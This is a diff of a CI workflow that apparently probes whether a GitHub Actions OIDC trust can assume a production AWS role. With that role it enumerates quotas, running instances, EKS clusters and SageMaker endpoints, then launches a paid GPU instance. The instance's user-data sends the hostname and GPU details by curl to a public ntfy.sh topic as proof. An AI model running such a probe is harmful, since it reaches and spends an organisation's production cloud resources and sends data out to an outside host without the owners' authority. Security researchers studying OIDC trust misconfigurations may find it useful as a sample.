@@ -33,7 +33,7 @@ jobs:
           if grep -q '<Credentials>' /tmp/sts_noenv.xml; then echo "NOENV_ASSUME=OK"; else echo "NOENV_ASSUME=FAIL"; fi
 
   oidc-probe:
-    name: environment production assume + bounded read-only census + one marker GPU
+    name: environment production assume and bounded census
     runs-on: ubuntu-latest
     environment: production
     timeout-minutes: 40
@@ -84,41 +84,53 @@ jobs:
           export AWS_DEFAULT_REGION=us-east-1
           set -u
           echo "== caller identity =="; aws sts get-caller-identity --output json 2>&1 | head -c 1500 || true
-          echo; echo "== ec2 on-demand/spot/P quotas =="
-          aws service-quotas list-service-quotas --service-code ec2 --output json 2>/dev/null | python3 -c '
-import sys,json
-try:
-    j=json.load(sys.stdin)
-except Exception as e:
-    print("quota_parse_err",e); raise SystemExit
-want=[q for q in j.get("Quotas",[]) if any(s in q.get("QuotaName","") for s in ["On-Demand","Spot Instance","P instances","G instances","Inf"])]
-for q in want[:60]:
-    print(q["QuotaCode"], "|", q["QuotaName"], "|", q.get("Value"), "|", q.get("GlobalQuota"))' 2>&1 | head -80 || true
-          echo; echo "== NVIDIA instance type offerings (us-east-1) =="
-          aws ec2 describe-instance-types --filters Name=GpuInfo.Gpus.Manufacturer,Values=NVIDIA --output json 2>/dev/null | python3 -c '
-import sys,json
-try: j=json.load(sys.stdin)
-except Exception as e: print("err",e); raise SystemExit
-for t in j.get("InstanceTypes",[]):
-    g=(t.get("GpuInfo") or {}).get("Gpus") or [{}]
-    print(t["InstanceType"], "|", g[0].get("Name"), "x"+str(g[0].get("Count")), "|", g[0].get("MemoryInMiB"), "MiB")' 2>&1 | head -40 || true
+          echo; echo "== ec2 quotas =="
+          aws service-quotas list-service-quotas --service-code ec2 --output json > /tmp/quotas.json 2>/dev/null || true
+          python3 - <<'PY'
+          import json
+          try:
+              j=json.load(open('/tmp/quotas.json'))
+          except Exception as e:
+              print("quota_parse_err", e); raise SystemExit
+          want=[q for q in j.get("Quotas",[]) if any(s in q.get("QuotaName","") for s in ["On-Demand","Spot Instance","P instances","G instances","Inf"])]
+          for q in want[:80]:
+              print(q["QuotaCode"], "|", q["QuotaName"], "|", q.get("Value"), "|", q.get("GlobalQuota"))
+          PY
+          echo; echo "== NVIDIA instance types =="
+          aws ec2 describe-instance-types --filters Name=GpuInfo.Gpus.Manufacturer,Values=NVIDIA --output json > /tmp/itypes.json 2>/dev/null || true
+          python3 - <<'PY'
+          import json
+          try:
+              j=json.load(open('/tmp/itypes.json'))
+          except Exception as e:
+              print("itypes_parse_err", e); raise SystemExit
+          for t in j.get("InstanceTypes",[]):
+              g=(t.get("GpuInfo") or {}).get("Gpus") or [{}]
+              print(t["InstanceType"], "|", g[0].get("Name"), "x"+str(g[0].get("Count")), "|", g[0].get("MemoryInMiB"), "MiB")
+          PY
           echo; echo "== capacity reservations =="
           aws ec2 describe-capacity-reservations --output json 2>&1 | head -c 2000 || true
-          echo; echo "== eks clusters =="; aws eks list-clusters --output json 2>&1 | head -c 800 || true
-          echo; echo "== sagemaker endpoints =="; aws sagemaker list-endpoints --output json 2>&1 | head -c 800 || true
-          echo; echo "== running instances (first 40) =="
-          aws ec2 describe-instances --filters Name=instance-state-name,Values=running --output json 2>/dev/null | python3 -c '
-import sys,json
-try: j=json.load(sys.stdin)
-except Exception as e: print("err",e); raise SystemExit
-n=0
-for r in j.get("Reservations",[]):
-    for i in r.get("Instances",[]):
-        n+=1
-        if n<=40: print(i["InstanceId"], i["InstanceType"], i["State"]["Name"], i.get("Tags"))
-print("TOTAL_RUNNING",n)' 2>&1 | head -50 || true
+          echo; echo "== eks clusters =="
+          aws eks list-clusters --output json 2>&1 | head -c 800 || true
+          echo; echo "== sagemaker endpoints =="
+          aws sagemaker list-endpoints --output json 2>&1 | head -c 800 || true
+          echo; echo "== running instances =="
+          aws ec2 describe-instances --filters Name=instance-state-name,Values=running --output json > /tmp/running.json 2>/dev/null || true
+          python3 - <<'PY'
+          import json
+          try:
+              j=json.load(open('/tmp/running.json'))
+          except Exception as e:
+              print("running_parse_err", e); raise SystemExit
+          n=0
+          for r in j.get("Reservations",[]):
+              for i in r.get("Instances",[]):
+                  n+=1
+                  if n<=40: print(i["InstanceId"], i["InstanceType"], i["State"]["Name"], i.get("Tags"))
+          print("TOTAL_RUNNING", n)
+          PY
 
-      - name: One minimal marker GPU (g4dn.xlarge) with console proof and guaranteed cleanup
+      - name: One minimal marker GPU g4dn.xlarge with console proof and guaranteed cleanup
         if: env.C211_ASSUME == 'OK'
         run: |
           export AWS_DEFAULT_REGION=us-east-1
@@ -141,29 +153,25 @@ print("TOTAL_RUNNING",n)' 2>&1 | head -50 || true
           SG=$(aws ec2 describe-security-groups --filters Name=vpc-id,Values=$VPC Name=group-name,Values=default --query "SecurityGroups[0].GroupId" --output text 2>/dev/null || true)
           echo "SUBNET=$SUBNET SG=$SG"
           AMI=""
-          for P in /aws/service/ecs/optimized-ami/amazon-linux-2/gpu/recommended/image_id /aws/service/ecs/optimized-ami/amazon-linux-2023/nvidia/recommended/image_id /aws/service/deeplearning/ami/x86_64/oss-nvidia-driver-gpu-pytorch-2.5-ubuntu-22.04/latest/ami-id; do
+          for P in /aws/service/ecs/optimized-ami/amazon-linux-2/gpu/recommended/image_id /aws/service/ecs/optimized-ami/amazon-linux-2023/nvidia/recommended/image_id; do
             AMI=$(aws ssm get-parameter --name "$P" --query "Parameter.Value" --output text 2>/dev/null || true)
             if [ -n "$AMI" ] && [ "$AMI" != "None" ]; then echo "AMI_FROM=$P"; break; fi
           done
           echo "AMI=$AMI"
           if [ -z "$AMI" ] || [ "$AMI" = "None" ]; then echo "MARKER=NO_GPU_AMI_FOUND"; exit 0; fi
           cat > /tmp/userdata.txt <<'UD'
-#!/bin/bash
-( nvidia-smi -L; nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader ) | tee /dev/console 2>&1
-echo C211_I106373_MARKER_DONE | tee /dev/console
-curl -sS -m 20 -d "C211_I106373 $(hostname) $(nvidia-smi -L | tr '\n' ' ')" https://ntfy.sh/c211-i106373-marker >/dev/null 2>&1 || true
-UD
-          IID=$(aws ec2 run-instances --image-id "$AMI" --instance-type g4dn.xlarge --count 1 \
-            --subnet-id "$SUBNET" --security-group-ids "$SG" \
-            --tag-specifications 'ResourceType=instance,Tags=[{Key=c211-i106373-marker,Value=1}]' \
-            --user-data file:///tmp/userdata.txt \
-            --query "Instances[0].InstanceId" --output text 2>&1 | tail -1)
+          #!/bin/bash
+          ( nvidia-smi -L; nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader ) | tee /dev/console 2>&1
+          echo C211_I106373_MARKER_DONE | tee /dev/console
+          curl -sS -m 20 -d "C211_I106373 $(hostname) $(nvidia-smi -L | tr '\n' ' ')" https://ntfy.sh/c211-i106373-marker >/dev/null 2>&1 || true
+          UD
+          IID=$(aws ec2 run-instances --image-id "$AMI" --instance-type g4dn.xlarge --count 1 --subnet-id "$SUBNET" --security-group-ids "$SG" --tag-specifications 'ResourceType=instance,Tags=[{Key=c211-i106373-marker,Value=1}]' --user-data file:///tmp/userdata.txt --query "Instances[0].InstanceId" --output text 2>&1 | tail -1)
           echo "MARKER_INSTANCE=$IID"
           case "$IID" in i-*) : ;; *) echo "MARKER=LAUNCH_FAILED"; IID=""; exit 0 ;; esac
           aws ec2 wait instance-running --instance-ids "$IID" 2>&1 | tail -2 || true
           aws ec2 describe-instances --instance-ids "$IID" --query "Reservations[0].Instances[0].[InstanceId,InstanceType,State.Name,Placement.AvailabilityZone]" --output text 2>&1 || true
           sleep 180
-          echo "== console output (tail) =="
+          echo "== console output tail =="
           aws ec2 get-console-output --instance-id "$IID" --output text 2>&1 | tail -c 4000 || true
 
       - name: Sentinel and tag sweep cleanup
